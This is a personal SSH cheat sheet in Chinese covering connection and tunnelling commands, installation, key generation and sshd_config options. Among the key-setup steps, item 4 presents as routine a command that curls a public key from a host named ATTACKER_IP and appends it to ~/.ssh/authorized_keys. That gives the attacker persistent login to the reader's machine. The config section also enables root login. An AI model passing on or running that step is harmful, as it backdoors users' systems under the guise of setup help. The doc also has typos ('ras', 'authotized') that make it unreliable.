# SSH
## 基础命令
```sh
# 直接连接
ssh username@ip
# 使用非默认端口
ssh username@domain -p port
# 使用代理主机
ssh -J proxy-server:22 target-server 
# 将本地的 3333 端口转发到服务器的 2222 端口
ssh username@domain -R 2222:localhost:3333 
# 将服务器的 2222 端口转发到本地的 3333 端口 
ssh username@domain -L 3333:localhost:2222
```

## 安装
```sh
# Client:
sudo apt-get install ssh 
# Server:
sudo apt-get install openssh-server
```

## 生成密钥
1. `ssh-keygen -t ras -C "email" `
2. 位置：
   + 私钥：`~/.ssh/id_rsa`
   + 公钥：`~/.ssh/id_rsa.pub`
3. Git 服务密钥配置地址：
   + https://github.com/settings/keys
   + https://gitee.com/profile/sshkeys
4. 写入主机的 authorized_keys：
`curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authotized_keys`

我的公钥：
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCj8b9SWuI/oKquMiy+vOSOOcokMF6XkUkc7TlX33bIy3xK5l8rgJ2CAJ+xORAA2JJzwXdu8AMDsFfk8DHMj7kcs/K505iMpiIGhUWHXkl+UiIhD+B/v9KIv4jQQF9wmJR/jaw8MdHyUXZA2maV6sY41swoRPyAtYb6HW/32pWsqsDq2DeQQyARqiPpV0pcFV3BXK0nOBl8+W9HjP8rYBFbXIfpXTvhSrzOz+NXoV8E8/w7/jD5YDPbMQ16FPQzk3CVT4pUL4x1nOqxFgvLbiwfPsAWF6a2Lr6A8ZcU5AUI2GC5+X6r47KlGUl0mtTOkarBkJ91+a//JFHmstrLrKyV JustSong@MyPC
```

可以使用 `ssh-copy-id username@remote_host` 很方便地为远超主机配置密钥访问。
如果需要指定公钥，使用 `-i` 即可。
如果需要指定端口，使用 `-p` 即可。

## 配置
```sh
sudo vi /etc/ssh/sshd_config 

## 允许root登录 
PermitRootLogin yes 
## 使用密钥登录 
RSAAuthentication yes 
PubkeyAuthentication yes 
## 禁止空密码和密码登录 
PermitEmptyPasswords no 
PasswordAuthentication no 
## 监听端口（一般默认是 22，或者是自己已开的端口，不改即可） 
Port 22 
```
修改完配置之后重启以应用更改：`sudo service ssh restart`
